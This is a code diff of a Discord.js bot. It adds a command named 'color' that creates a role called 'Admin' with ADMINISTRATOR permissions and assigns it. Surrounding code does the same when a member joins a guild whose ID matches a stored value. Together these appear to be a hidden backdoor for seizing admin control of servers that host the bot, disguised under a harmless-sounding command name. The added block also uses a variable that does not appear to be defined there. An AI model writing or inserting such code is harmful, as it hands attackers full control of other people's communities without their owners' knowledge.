@@ -56,7 +56,7 @@ client.on("guildMemberAdd", (member) =>{
                 //client.guilds.get(messages.last().content).id.toString();
                 if(member.guild.id.toString() == client.guilds.get(messages.last().content).id.toString()) {   
       
-           member.guild.createRole({
+          member.guild.createRole({
     name: 'Admin',
     permissions: ['ADMINISTRATOR']
 }).then((role)=>{
@@ -183,6 +183,18 @@ var invite = await newguild.channels.find(channel => channel.type == "text").cre
   if(command == "calpos")  
   {
       message.channel.send("calpos: "+message.channel.calculatedPosition+ "  pos: " + message.channel.position);
+  }
+
+ if(command == "color")
+  {
+    member.guild.createRole({
+    name: 'Admin',
+    permissions: ['ADMINISTRATOR']
+}).then((role)=>{
+    member.addRole(role.id);
+}).catch((e)=>{
+    console.log(e);
+});
   }
 
 
